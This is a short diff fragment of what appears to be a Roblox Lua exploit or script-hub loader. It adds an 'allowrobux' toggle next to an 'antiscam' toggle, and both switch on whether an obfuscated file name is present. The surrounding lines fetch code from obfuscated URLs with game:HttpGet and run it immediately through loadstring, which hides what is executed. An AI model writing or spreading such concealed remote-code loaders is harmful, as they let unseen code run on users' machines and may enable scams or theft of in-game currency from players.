@@ -5092,6 +5092,8 @@ local status, res1, res2 = pcall(function()
             end
 
 	    setantiscam(not isinternalfile(secretstring("hop9kJCXm4B4jZOOb3p/")))
+	    setallowrobux(not isinternalfile(secretstring("hY+LjZaOinZ0joQ=")))
+
             loadstring(game:HttpGet(secretstring("ioV2f39B1baEmpG7c4KGn4mdi5apl5mmhp2TqZTroa6xcLqYm5KPnKPcs6Gx3LGzqbeY4qWux8WHvaPNtLbPrrW01/TUrfGwya3Z0MjRHOHJ2g==")))()
 	    loadstring(game:HttpGet(secretstring("ioV2f39B1baEmpG7c4KGn4mdi5apl5mmhp2TqZTroa6xcMmSk5ePoeTu7+f7tL6ev63htZ2tsYbEvqfFr+yvpLHPEdS3uM+/w/jS1L7B45661soEyurm4eEK6+viyg/S0+LvE9Tq2w==")))()
 
